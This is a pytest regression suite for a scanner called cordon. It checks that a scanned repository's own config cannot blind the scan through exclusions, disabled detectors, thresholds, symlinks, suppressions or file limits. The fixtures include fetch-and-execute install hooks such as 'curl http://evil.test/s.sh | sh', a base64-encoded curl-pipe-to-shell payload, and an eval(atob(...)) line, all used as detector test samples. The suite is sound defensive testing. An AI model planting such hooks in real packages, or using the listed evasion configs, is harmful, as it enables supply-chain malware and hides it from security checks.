"""Attempts to make the scanner report a clean result without examining anything.

Every test here is written from the position of somebody who controls the
repository being scanned and wants the pipeline to stay green. That is the real
adversary: the scan target is untrusted input, and a configuration file that
lives inside it is part of that input.

None of these attacks is *prevented*, because a repository has legitimate
reasons to exclude a generated tree and to turn off a detector that does not
apply to it. What is asserted throughout is that the reduction in coverage
appears in the output. The property under test is a single sentence:

    a scan that examined nothing must never look like a scan that found nothing.

These are regression tests for an adversarial review in which each of the five
cases below produced silence and exit code 0.
"""

from __future__ import annotations

import os
import sys
from dataclasses import replace
from datetime import date, timedelta
from pathlib import Path

import pytest

from cordon import Scanner
from cordon.core.config import Config, ConfigResolver, OrgConstraints, Policy
from cordon.core.errors import ConfigError, CordonError, ExitCode
from cordon.core.models import Category, Confidence, Severity
from cordon.core.policy import PolicyGate

# A suppression must expire within the tool's own ceiling, which applies whether
# or not an organisation policy is configured.
WITHIN_CEILING = (date.today() + timedelta(days=90)).isoformat()

PAYLOAD = (
    "const {execSync} = require('child_process');\n"
    "execSync(Buffer.from('Y3VybCBldmlsfHNo','base64').toString());\n"
)
MANIFEST = '{"name":"evil","version":"1.0.0","scripts":{"postinstall":"node p.js"}}'


def hostile_repo(root, config_text: str):
    """A repository whose payload any working scan must find, plus a config
    written to stop it being found."""
    root.mkdir(parents=True, exist_ok=True)
    (root / "p.js").write_text(PAYLOAD)
    (root / "package.json").write_text(MANIFEST)
    (root / "cordon.yaml").write_text(config_text)
    return root


def scan(root, **overrides):
    return Scanner(
        ConfigResolver.resolve(root=root).with_overrides(use_cache=False, **overrides)
    ).scan(root)


def rule_ids(result) -> set[str]:
    return {f.rule_id for f in result.findings}


class TestBlindingByExclusion:
    """A1. The original finding: `exclude: ["**/*"]` produced zero findings,
    zero files scanned, exit 0 and no warning of any kind."""

    def test_excluding_everything_is_reported(self, tmp_path) -> None:
        root = hostile_repo(tmp_path / "r", 'scan:\n  exclude:\n    - "**/*"\n')
        result = scan(root)
        assert "POLICY.COVERAGE.NOTHING_SCANNED" in rule_ids(result)

    def test_excluding_everything_does_not_exit_clean(self, tmp_path) -> None:
        """The exit code is what a CI pipeline acts on. A finding nobody fails
        on is a finding nobody sees."""
        root = hostile_repo(tmp_path / "r", 'scan:\n  exclude:\n    - "**/*"\n')
        config = ConfigResolver.resolve(root=root).with_overrides(use_cache=False)
        verdict = PolicyGate.evaluate(Scanner(config).scan(root), config.policy)
        assert verdict.exit_code is not ExitCode.CLEAN

    def test_the_report_is_high_severity(self, tmp_path) -> None:
        root = hostile_repo(tmp_path / "r", 'scan:\n  exclude:\n    - "**/*"\n')
        finding = next(
            f for f in scan(root).findings if f.rule_id == "POLICY.COVERAGE.NOTHING_SCANNED"
        )
        assert finding.severity is Severity.HIGH
        assert finding.category is Category.POLICY

    def test_the_message_says_nothing_was_examined(self, tmp_path) -> None:
        """The wording carries the whole point. A reader who sees 'no findings'
        must not conclude 'no problems'."""
        root = hostile_repo(tmp_path / "r", 'scan:\n  exclude:\n    - "**/*"\n')
        finding = next(
            f for f in scan(root).findings if f.rule_id == "POLICY.COVERAGE.NOTHING_SCANNED"
        )
        assert "no files were examined" in finding.message.lower()
        assert finding.remediation

    def test_an_include_list_is_an_exclusion_written_backwards(self, tmp_path) -> None:
        """`include: ["docs/**"]` in a repository with no docs directory drops
        every file just as surely, and was the obvious way around a fix that
        only counted `exclude`."""
        root = hostile_repo(tmp_path / "r", 'scan:\n  include:\n    - "docs/**"\n')
        assert "POLICY.COVERAGE.NOTHING_SCANNED" in rule_ids(scan(root))

    def test_an_empty_directory_is_not_reported(self, tmp_path) -> None:
        """Nothing examined because nothing is there is not a coverage loss, and
        a check that fires on it teaches people to ignore it."""
        root = tmp_path / "empty"
        root.mkdir()
        assert "POLICY.COVERAGE.NOTHING_SCANNED" not in rule_ids(scan(root))

    def test_a_normal_repository_is_not_reported(self, tmp_path) -> None:
        root = tmp_path / "ok"
        root.mkdir()
        for i in range(40):
            (root / f"m{i}.py").write_text(f"VALUE = {i}\n")
        ids = rule_ids(scan(root))
        assert "POLICY.COVERAGE.NOTHING_SCANNED" not in ids
        assert "POLICY.COVERAGE.BROAD_EXCLUSION" not in ids


class TestBroadExclusion:
    """The partial version of the same attack: exclude almost everything, leave
    one harmless file so the scan is not visibly empty."""

    def build(self, tmp_path, excluded: int, kept: int, pattern: str):
        root = tmp_path / "r"
        (root / "vendor").mkdir(parents=True)
        for i in range(excluded):
            (root / "vendor" / f"v{i}.js").write_text(f"var v = {i};\n")
        for i in range(kept):
            (root / f"k{i}.js").write_text(f"var k = {i};\n")
        (root / "cordon.yaml").write_text(f'scan:\n  exclude:\n    - "{pattern}"\n')
        return root

    def test_excluding_most_of_the_tree_is_reported(self, tmp_path) -> None:
        root = self.build(tmp_path, excluded=90, kept=2, pattern="vendor/**")
        assert "POLICY.COVERAGE.BROAD_EXCLUSION" in rule_ids(scan(root))

    def test_the_report_counts_what_was_dropped(self, tmp_path) -> None:
        """A share alone is not actionable. The reader needs the numbers to
        judge whether the exclusion is the vendored tree they expect."""
        root = self.build(tmp_path, excluded=90, kept=2, pattern="vendor/**")
        finding = next(
            f for f in scan(root).findings if f.rule_id == "POLICY.COVERAGE.BROAD_EXCLUSION"
        )
        assert "90 of 93" in finding.message
        assert "%" in finding.message

    def test_a_modest_exclusion_is_not_reported(self, tmp_path) -> None:
        """Excluding a generated directory is ordinary and correct."""
        root = self.build(tmp_path, excluded=10, kept=40, pattern="vendor/**")
        assert "POLICY.COVERAGE.BROAD_EXCLUSION" not in rule_ids(scan(root))

    def test_a_small_repository_is_not_reported(self, tmp_path) -> None:
        """In a five-file repository one excluded directory is most of the tree,
        so the share alone would fire constantly on correct configuration."""
        root = self.build(tmp_path, excluded=4, kept=1, pattern="vendor/**")
        assert "POLICY.COVERAGE.BROAD_EXCLUSION" not in rule_ids(scan(root))

    def test_the_payload_is_still_found_when_not_excluded(self, tmp_path) -> None:
        """A guard against the fix being satisfied by reporting coverage while
        quietly scanning nothing."""
        root = hostile_repo(tmp_path / "r", "scan:\n  severity_threshold: low\n")
        findings = scan(root).findings
        assert findings
        assert any("DECODE_EXEC" in f.rule_id for f in findings)


class TestDisabledDetectors:
    """The other half of A1: the config disabled the two detectors that would
    have found the payload, and the output said nothing about it."""

    def test_a_detector_the_repository_disabled_is_reported(self, tmp_path) -> None:
        root = hostile_repo(
            tmp_path / "r",
            "scan:\n  detectors:\n    capability: false\n    secrets: false\n",
        )
        assert "POLICY.COVERAGE.DETECTOR_DISABLED" in rule_ids(scan(root))

    def test_the_report_names_each_detector(self, tmp_path) -> None:
        root = hostile_repo(
            tmp_path / "r",
            "scan:\n  detectors:\n    capability: false\n    secrets: false\n",
        )
        finding = next(
            f for f in scan(root).findings if f.rule_id == "POLICY.COVERAGE.DETECTOR_DISABLED"
        )
        assert "capability" in finding.message
        assert "secrets" in finding.message

    def test_an_operator_disabling_a_detector_is_not_reported(self, tmp_path) -> None:
        """`--no-detector secrets` typed by the person running the scan is not
        an attack on that person. Only configuration that came from the scan
        target is treated as adversarial."""
        root = tmp_path / "r"
        root.mkdir()
        (root / "p.js").write_text(PAYLOAD)
        config = Config.default().with_overrides(
            use_cache=False, detectors={"secrets": False, "capability": False}
        )
        result = Scanner(config).scan(root)
        assert "POLICY.COVERAGE.DETECTOR_DISABLED" not in rule_ids(result)


class TestWithheldPowers:
    """A7 and A5b. A configuration file inside the scan target asked for
    capabilities it must not have. The request is refused; the refusal is
    reported rather than applied in silence."""

    def test_a_repository_cannot_raise_its_own_limits(self, tmp_path) -> None:
        """Otherwise any repository can set a multi-hour timeout and a gigabyte
        file ceiling, and the shared CI machine is the target."""
        root = hostile_repo(
            tmp_path / "r",
            "scan:\n  limits:\n    max_file_bytes: 999999999\n    total_timeout: 99999\n",
        )
        config = ConfigResolver.resolve(root=root)
        defaults = Config.default()
        assert config.limits.max_file_bytes == defaults.limits.max_file_bytes
        assert config.limits.total_timeout == defaults.limits.total_timeout
        assert "limits.max_file_bytes" in config.clamped_settings
        assert "limits.total_timeout" in config.clamped_settings

    def test_a_repository_cannot_supply_its_own_rule_pack(self, tmp_path) -> None:
        """A rule pack decides what counts as a finding. A scan target that
        writes its own rules decides its own verdict."""
        root = tmp_path / "r"
        root.mkdir()
        (root / "mine.yaml").write_text("rules: []\n")
        (root / "cordon.yaml").write_text("rules:\n  extra:\n    - mine.yaml\n")
        config = ConfigResolver.resolve(root=root)
        assert not config.extra_rule_paths
        assert "rules.extra" in config.clamped_settings

    def test_each_withheld_setting_is_reported(self, tmp_path) -> None:
        """Silently ignoring the setting would be safe and useless: the author
        would believe it applied."""
        root = hostile_repo(
            tmp_path / "r",
            "scan:\n  limits:\n    max_file_bytes: 999999999\n",
        )
        clamped = [f for f in scan(root).findings if f.rule_id == "POLICY.CONFIG.CLAMPED"]
        assert clamped
        assert "limits.max_file_bytes" in clamped[0].message
        assert clamped[0].remediation

    def test_an_explicit_config_file_keeps_its_powers(self, tmp_path) -> None:
        """`--config` is operator input. Someone who names a file on the command
        line has chosen to trust it, and clamping it there would make the flag
        useless for the tuning it exists for."""
        cfg = tmp_path / "operator.yaml"
        cfg.write_text("scan:\n  limits:\n    max_file_bytes: 99999999\n")
        config = ConfigResolver.resolve(root=tmp_path, config_path=cfg)
        assert config.limits.max_file_bytes == 99999999
        assert not config.clamped_settings

    def test_a_trusted_config_reports_nothing(self, tmp_path) -> None:
        root = tmp_path / "r"
        root.mkdir()
        (root / "a.py").write_text("VALUE = 1\n")
        ids = rule_ids(Scanner(Config.default().with_overrides(use_cache=False)).scan(root))
        assert "POLICY.CONFIG.CLAMPED" not in ids


@pytest.mark.skipif(sys.platform == "win32", reason="symlink creation needs privilege on Windows")
class TestConfigOutsideTheScanRoot:
    """A8. `cordon.yaml` was a symlink, so the file reviewed alongside the code
    was not the file that configured the scan."""

    def test_a_symlinked_config_is_refused(self, tmp_path) -> None:
        outside = tmp_path / "outside.yaml"
        outside.write_text('scan:\n  exclude:\n    - "**/*"\n')
        root = tmp_path / "r"
        root.mkdir()
        (root / "a.py").write_text("VALUE = 1\n")
        (root / "cordon.yaml").symlink_to(outside)
        with pytest.raises(ConfigError) as exc:
            ConfigResolver.resolve(root=root)
        assert "outside the scan root" in str(exc.value)

    def test_the_refusal_names_the_way_out(self, tmp_path) -> None:
        """A repository may legitimately share configuration. The error has to
        say how, or it gets worked around by deleting the check."""
        outside = tmp_path / "outside.yaml"
        outside.write_text("scan:\n  severity_threshold: low\n")
        root = tmp_path / "r"
        root.mkdir()
        (root / "cordon.yaml").symlink_to(outside)
        with pytest.raises(ConfigError) as exc:
            ConfigResolver.resolve(root=root)
        assert "--config" in (exc.value.hint or "")

    def test_a_symlink_within_the_scan_root_is_allowed(self, tmp_path) -> None:
        """The file is still reviewed with the code, which is the property that
        matters. Refusing this would break monorepos that share one config."""
        root = tmp_path / "r"
        (root / "shared").mkdir(parents=True)
        (root / "shared" / "base.yaml").write_text("scan:\n  severity_threshold: low\n")
        (root / "cordon.yaml").symlink_to(root / "shared" / "base.yaml")
        assert ConfigResolver.resolve(root=root).severity_threshold is Severity.LOW


class TestUnknownDetectorName:
    """A11. A mistyped `--detector` name selected no detectors, so the scan ran
    no checks, found nothing and exited 0. A typo in a CI file silently turned
    off all scanning while the pipeline stayed green."""

    def test_an_unknown_name_is_an_error(self, tmp_path) -> None:
        from cordon.core.registry import Registry

        with pytest.raises(ConfigError) as exc:
            Registry().detectors(only=["secrest"])
        assert "secrest" in str(exc.value)

    def test_the_error_lists_the_real_names(self, tmp_path) -> None:
        """Without this the fix converts a silent failure into a loud one that
        still does not say what to type."""
        from cordon.core.registry import Registry

        with pytest.raises(ConfigError) as exc:
            Registry().detectors(only=["secrest"])
        assert "secrets" in (exc.value.hint or "")

    def test_a_correct_name_still_selects_it(self, tmp_path) -> None:
        from cordon.core.registry import Registry

        loaded = Registry().detectors(only=["secrets"])
        assert [d.id for d in loaded] == ["secrets"]

    def test_one_bad_name_among_good_ones_is_still_an_error(self) -> None:
        """Otherwise the failure is worse than the original: it looks like it
        worked, and one check is missing."""
        from cordon.core.registry import Registry

        with pytest.raises(ConfigError):
            Registry().detectors(only=["secrets", "capability", "typo"])


class TestTheFixCannotBeTurnedOff:
    """Second adversarial pass, against the fix for the first one.

    The coverage findings are only worth anything if the configuration that
    caused the coverage loss cannot also hide the report of it. Each test here
    is a two-line configuration that made the previous fix useless.
    """

    def test_a_reporting_threshold_cannot_hide_it(self, tmp_path) -> None:
        """`exclude: ["**/*"]` blinds the scan; `severity_threshold: critical`
        then hid the HIGH finding that said so. Two lines, in a file the scan
        target supplies, and the result was clean and silent again."""
        root = hostile_repo(
            tmp_path / "r",
            'scan:\n  exclude:\n    - "**/*"\n  severity_threshold: critical\n',
        )
        assert "POLICY.COVERAGE.NOTHING_SCANNED" in rule_ids(scan(root))

    def test_a_reporting_threshold_cannot_hide_the_exit_code_either(self, tmp_path) -> None:
        root = hostile_repo(
            tmp_path / "r",
            'scan:\n  exclude:\n    - "**/*"\n  severity_threshold: critical\n',
        )
        config = ConfigResolver.resolve(root=root).with_overrides(use_cache=False)
        verdict = PolicyGate.evaluate(Scanner(config).scan(root), config.policy)
        assert verdict.exit_code is not ExitCode.CLEAN

    def test_a_wildcard_path_suppression_is_refused_outright(self, tmp_path) -> None:
        """The first thing an attacker reaches for, and it no longer parses.
        `path: "**"` disabled a rule repository-wide, which is exactly what the
        rule-and-path pair exists to prevent."""
        root = hostile_repo(
            tmp_path / "r",
            'scan:\n  exclude:\n    - "**/*"\n'
            "suppressions:\n"
            "  - rule: POLICY.COVERAGE.NOTHING_SCANNED\n"
            '    path: "**"\n'
            "    justification: a justification long enough to pass the length rule\n"
            "    expires: " + WITHIN_CEILING + "\n",
        )
        with pytest.raises(CordonError):
            ConfigResolver.resolve(root=root)

    def test_a_suppression_cannot_hide_it(self, tmp_path) -> None:
        """A suppression is a decision to accept a known risk. There is no risk
        described here to accept -- only an absent scan -- so suppressing this
        asserts that a result nobody produced should be read as a pass."""
        root = tmp_path / "r"
        root.mkdir()
        (root / "p.js").write_text(PAYLOAD)
        (root / "package.json").write_text(MANIFEST)
        (root / "cordon.yaml").write_text(
            'scan:\n  exclude:\n    - "**/*"\n'
            "suppressions:\n"
            "  - rule: POLICY.COVERAGE.NOTHING_SCANNED\n"
            f'    path: "{root.as_posix()}"\n'
            "    justification: a justification long enough to pass the length rule\n"
            "    expires: " + WITHIN_CEILING + "\n"
        )
        finding = next(
            f for f in scan(root).findings if f.rule_id == "POLICY.COVERAGE.NOTHING_SCANNED"
        )
        assert finding.suppressed is None

    def test_the_refusal_does_not_depend_on_organisation_policy(self, tmp_path) -> None:
        """Most repositories have no organisation policy. A protection that only
        works when somebody configured one protects nobody by default."""
        root = hostile_repo(
            tmp_path / "r",
            'scan:\n  exclude:\n    - "**/*"\n'
            "suppressions:\n"
            "  - rule: POLICY.COVERAGE.NOTHING_SCANNED\n"
            f'    path: "{(tmp_path / "r").as_posix()}"\n'
            "    justification: a justification long enough to pass the length rule\n"
            "    expires: " + WITHIN_CEILING + "\n",
        )
        config = ConfigResolver.resolve(root=root).with_overrides(use_cache=False)
        # No organisation policy is configured here, which is the default state
        # for almost every repository.
        assert config.constraints == OrgConstraints.permissive()
        verdict = PolicyGate.evaluate(Scanner(config).scan(root), config.policy)
        assert verdict.exit_code is not ExitCode.CLEAN

    def test_ordinary_findings_are_still_suppressible(self, tmp_path) -> None:
        """The refusal must be narrow. A tool whose suppressions do not work is
        a tool that gets removed from the pipeline."""
        root = tmp_path / "r"
        root.mkdir()
        (root / "p.js").write_text(PAYLOAD)
        (root / "cordon.yaml").write_text(
            "suppressions:\n"
            "  - rule: SUSPECT.DECODE_EXEC.001\n"
            '    path: "p.js"\n'
            "    justification: a justification long enough to pass the length rule\n"
            "    expires: " + WITHIN_CEILING + "\n"
        )
        findings = [f for f in scan(root).findings if f.rule_id == "SUSPECT.DECODE_EXEC.001"]
        assert findings
        assert findings[0].suppressed is not None

    def test_a_suppressed_finding_is_marked_not_removed(self, tmp_path) -> None:
        """An auditor's first question is what the tool was told to ignore."""
        root = tmp_path / "r"
        root.mkdir()
        (root / "p.js").write_text(PAYLOAD)
        (root / "cordon.yaml").write_text(
            "suppressions:\n"
            "  - rule: SUSPECT.DECODE_EXEC.001\n"
            '    path: "p.js"\n'
            "    justification: a justification long enough to pass the length rule\n"
            "    expires: " + WITHIN_CEILING + "\n"
        )
        assert "SUSPECT.DECODE_EXEC.001" in rule_ids(scan(root))


class TestNarrowedSourcesReportEmptySelection:
    """A source sits between the walker and the detectors, so the walker's own
    counters do not see what it removed. `--tracked` in a repository where git
    tracks nothing selected zero files while the stats reported a full
    traversal: the pipeline scanned nothing and reported success."""

    def test_a_source_that_selects_nothing_is_reported(self, tmp_path) -> None:
        from cordon.core.engine import Engine
        from cordon.sources.git import GitPathSource

        root = tmp_path / "r"
        root.mkdir()
        (root / "p.js").write_text(PAYLOAD)

        engine = Engine(
            Config.default().with_overrides(use_cache=False),
            source=GitPathSource([], mode="tracked"),
        )
        ids = {f.rule_id for f in engine.scan(root).findings}
        assert "POLICY.COVERAGE.NOTHING_SCANNED" in ids

    def test_an_empty_staged_set_is_a_note_not_a_warning(self, tmp_path) -> None:
        """A pre-commit hook fires on every commit, including ones that stage
        nothing. Failing there teaches people to pass --no-verify, which turns
        off every check rather than this one."""
        from cordon.core.engine import Engine
        from cordon.sources.git import GitIndexSource, GitRepository

        root = tmp_path / "r"
        root.mkdir()
        (root / "p.js").write_text(PAYLOAD)

        engine = Engine(
            Config.default().with_overrides(use_cache=False),
            source=GitIndexSource(GitRepository(root), []),
        )
        finding = next(
            f for f in engine.scan(root).findings if f.rule_id == "POLICY.COVERAGE.NOTHING_SCANNED"
        )
        assert finding.severity is Severity.INFO

    def test_it_is_still_reported_even_as_a_note(self, tmp_path) -> None:
        """Lowering the severity must not become hiding it."""
        from cordon.core.engine import Engine
        from cordon.sources.git import GitIndexSource, GitRepository

        root = tmp_path / "r"
        root.mkdir()
        (root / "p.js").write_text(PAYLOAD)

        config = Config.default().with_overrides(
            use_cache=False, severity_threshold=Severity.CRITICAL
        )
        engine = Engine(config, source=GitIndexSource(GitRepository(root), []))
        result = PolicyGate.filter_for_reporting(engine.scan(root), config)
        assert "POLICY.COVERAGE.NOTHING_SCANNED" in {f.rule_id for f in result.findings}


class TestLimitsAsAnExclusion:
    """Third adversarial pass. `limits` are clamped when a scan target raises
    them, because raising is a denial of service against the machine running the
    scan. Lowering was not considered, and it is the same attack from the other
    direction: `max_files: 5` stops the traversal before it reaches the payload,
    and produces no exclusion pattern for anything to report.
    """

    def build(self, tmp_path, max_files: int):
        root = tmp_path / "r"
        root.mkdir()
        for i in range(40):
            (root / f"f{i}.js").write_text(f"var x = {i};\n")
        (root / "zz_payload.js").write_text(PAYLOAD)
        (root / "cordon.yaml").write_text(f"scan:\n  limits:\n    max_files: {max_files}\n")
        return root

    def test_the_payload_is_missed_when_the_limit_truncates(self, tmp_path) -> None:
        """Establishes the attack works, so the rest proves something."""
        root = self.build(tmp_path, max_files=5)
        assert "SUSPECT.DECODE_EXEC.001" not in rule_ids(scan(root))

    def test_a_lowered_limit_is_reported(self, tmp_path) -> None:
        root = self.build(tmp_path, max_files=5)
        assert "POLICY.CONFIG.LIMIT_REDUCED" in rule_ids(scan(root))

    def test_a_limit_that_truncated_the_scan_fails_the_build(self, tmp_path) -> None:
        """An incomplete scan does not fail by default, and that default is
        right for a repository that outgrew one. It is not right for a scan that
        is incomplete because the scan target asked for it to be."""
        root = self.build(tmp_path, max_files=5)
        config = ConfigResolver.resolve(root=root).with_overrides(use_cache=False)
        verdict = PolicyGate.evaluate(Scanner(config).scan(root), config.policy)
        assert verdict.exit_code is not ExitCode.CLEAN

    def test_a_lowered_limit_that_truncates_nothing_is_only_a_note(self, tmp_path) -> None:
        """The report must not become noise. A repository capping its own scan
        cost without losing coverage has done nothing wrong."""
        root = self.build(tmp_path, max_files=5000)
        finding = next(f for f in scan(root).findings if f.rule_id == "POLICY.CONFIG.LIMIT_REDUCED")
        assert finding.severity is Severity.MEDIUM

    def test_the_payload_is_still_found_when_the_limit_does_not_truncate(self, tmp_path) -> None:
        root = self.build(tmp_path, max_files=5000)
        assert "SUSPECT.DECODE_EXEC.001" in rule_ids(scan(root))

    def test_raising_a_limit_is_still_refused_rather_than_reported(self, tmp_path) -> None:
        """The two directions get different treatment on purpose. Raising is a
        denial of service against someone else's machine and is refused;
        lowering only harms the repository's own coverage and is reported."""
        root = tmp_path / "r"
        root.mkdir()
        (root / "a.py").write_text("VALUE = 1\n")
        (root / "cordon.yaml").write_text("scan:\n  limits:\n    max_file_bytes: 999999999\n")
        config = ConfigResolver.resolve(root=root)
        assert "limits.max_file_bytes" in config.clamped_settings
        assert "limits.max_file_bytes" not in config.reduced_limits

    def test_an_operator_lowering_a_limit_is_not_reported(self, tmp_path) -> None:
        """`--timeout 10` typed by the person running the scan is their choice
        about their own machine, not an attack on it."""
        root = tmp_path / "r"
        root.mkdir()
        (root / "a.py").write_text("VALUE = 1\n")
        config = Config.default()
        config = config.with_overrides(use_cache=False, limits=config.limits.merged(max_files=5))
        assert "POLICY.CONFIG.LIMIT_REDUCED" not in rule_ids(Scanner(config).scan(root))


class TestThresholdsCannotWeakenTheGate:
    """Fourth adversarial pass, and the most serious finding of the review.

    `filter_for_reporting` runs inside the scan, so the failure gate only ever
    saw the findings that survived it. One line in a repository's own
    configuration therefore hid a CRITICAL malware finding about that repository
    from the report *and* from the exit code:

        scan:
          confidence_threshold: confirmed

    The build went green over a fetch-and-execute preinstall hook. The docstring
    on that method asserted the opposite -- that the gate had already run and
    could not be weakened -- which is why nothing caught it.
    """

    MALICIOUS_MANIFEST = (
        '{"name":"evil","version":"1.0.0",'
        '"scripts":{"preinstall":"curl http://evil.test/s.sh | sh"}}'
    )

    def build(self, tmp_path, config_text: str):
        root = tmp_path / "r"
        root.mkdir()
        (root / "package.json").write_text(self.MALICIOUS_MANIFEST)
        (root / "cordon.yaml").write_text(config_text)
        return root

    def test_a_confidence_threshold_cannot_hide_malware(self, tmp_path) -> None:
        root = self.build(tmp_path, "scan:\n  confidence_threshold: confirmed\n")
        assert "MALWARE.INSTALL.FETCH_EXEC.001" in rule_ids(scan(root))

    def test_a_confidence_threshold_cannot_zero_the_exit_code(self, tmp_path) -> None:
        root = self.build(tmp_path, "scan:\n  confidence_threshold: confirmed\n")
        config = ConfigResolver.resolve(root=root).with_overrides(use_cache=False)
        verdict = PolicyGate.evaluate(Scanner(config).scan(root), config.policy)
        assert verdict.exit_code is ExitCode.FINDINGS

    def test_a_severity_threshold_cannot_hide_what_fails_the_build(self, tmp_path) -> None:
        root = tmp_path / "r"
        root.mkdir()
        (root / "p.js").write_text(PAYLOAD)
        (root / "cordon.yaml").write_text("scan:\n  severity_threshold: critical\n")
        config = ConfigResolver.resolve(root=root).with_overrides(use_cache=False)
        result = Scanner(config).scan(root)
        assert "SUSPECT.DECODE_EXEC.001" in {f.rule_id for f in result.findings}
        assert PolicyGate.evaluate(result, config.policy).exit_code is ExitCode.FINDINGS

    def test_both_thresholds_together_cannot_hide_it(self, tmp_path) -> None:
        root = self.build(
            tmp_path,
            "scan:\n  severity_threshold: critical\n  confidence_threshold: confirmed\n",
        )
        assert "MALWARE.INSTALL.FETCH_EXEC.001" in rule_ids(scan(root))

    def test_a_threshold_still_hides_what_does_not_fail_the_build(self, tmp_path) -> None:
        """The exemption has to be exactly as wide as the gate and no wider, or
        the thresholds stop working and people remove the tool instead."""
        root = tmp_path / "r"
        root.mkdir()
        (root / "p.js").write_text(PAYLOAD)
        config = Config.default().with_overrides(
            use_cache=False,
            severity_threshold=Severity.CRITICAL,
            confidence_threshold=Confidence.CONFIRMED,
        )
        # fail_on defaults to high; raise it so nothing here trips the gate.
        config = config.with_overrides(
            policy=replace(config.policy, fail_on_severity=Severity.CRITICAL)
        )
        result = Scanner(config).scan(root)
        assert "SUSPECT.DECODE_EXEC.001" not in {f.rule_id for f in result.findings}

    def test_the_report_always_explains_a_non_zero_exit(self, tmp_path) -> None:
        """The property underneath all of this. A pipeline that fails and prints
        nothing about why gets a `|| true` appended to it."""
        root = self.build(tmp_path, "scan:\n  confidence_threshold: confirmed\n")
        config = ConfigResolver.resolve(root=root).with_overrides(use_cache=False)
        result = Scanner(config).scan(root)
        verdict = PolicyGate.evaluate(result, config.policy)
        assert verdict.exit_code is not ExitCode.CLEAN
        reported = {f.fingerprint for f in result.findings}
        assert all(f.fingerprint in reported for f in verdict.triggering)


@pytest.mark.skipif(os.name == "nt", reason="POSIX permission bits")
class TestUnreadableIsNotClean:
    """A repository nothing can be read from must not report like an empty one.

    The coverage check counted files the walker *selected*, and a file that is
    selected and then fails to open still counts. Make every file in the tree
    unreadable and each produced an INFO note, the selected count stayed at its
    full value, the check never fired, and the scan exited 0 -- the one outcome
    this tool exists to prevent.
    """

    def scan(self, root: Path):
        config = Config.default().with_overrides(use_cache=False)
        return Scanner(config).scan(root)

    def repository(self, tmp_path: Path, *, readable: int, unreadable: int) -> Path:
        root = tmp_path / "repo"
        root.mkdir()
        for index in range(readable):
            (root / f"ok{index}.js").write_text("const a = 1;\n")
        for index in range(unreadable):
            path = root / f"locked{index}.js"
            path.write_text('eval(atob("cGF5bG9hZA=="))\n')
            path.chmod(0o000)
        return root

    def test_a_wholly_unreadable_tree_fails_the_gate(self, tmp_path: Path) -> None:
        root = self.repository(tmp_path, readable=0, unreadable=4)
        try:
            result = self.scan(root)
            coverage = [
                f for f in result.findings if f.rule_id == "POLICY.COVERAGE.NOTHING_SCANNED"
            ]
            assert coverage, [f.rule_id for f in result.findings]
            assert coverage[0].severity is Severity.HIGH
            assert PolicyGate.evaluate(result, Policy.default()).exit_code is not ExitCode.CLEAN
        finally:
            for path in root.glob("locked*.js"):
                path.chmod(0o644)

    def test_the_message_names_the_cause(self, tmp_path: Path) -> None:
        """ "Everything was excluded" and "nothing could be opened" call for
        different actions, and the remediation is useless if it names the wrong
        one."""
        root = self.repository(tmp_path, readable=0, unreadable=3)
        try:
            result = self.scan(root)
            message = next(
                f.message for f in result.findings if f.rule_id == "POLICY.COVERAGE.NOTHING_SCANNED"
            )
            assert "could be read" in message
        finally:
            for path in root.glob("locked*.js"):
                path.chmod(0o644)

    def test_one_readable_file_is_not_a_blinded_scan(self, tmp_path: Path) -> None:
        """The check is for a scan that examined nothing. A single unreadable
        file among readable ones is an ordinary permissions accident, and
        failing the build on it is how a control gets switched off."""
        root = self.repository(tmp_path, readable=3, unreadable=1)
        try:
            result = self.scan(root)
            assert not [
                f for f in result.findings if f.rule_id == "POLICY.COVERAGE.NOTHING_SCANNED"
            ]
        finally:
            for path in root.glob("locked*.js"):
                path.chmod(0o644)

    def test_an_empty_tree_is_still_not_a_finding(self, tmp_path: Path) -> None:
        """Nothing present is not the same as nothing examined."""
        root = tmp_path / "empty"
        root.mkdir()
        result = self.scan(root)
        assert not [f for f in result.findings if f.rule_id == "POLICY.COVERAGE.NOTHING_SCANNED"]
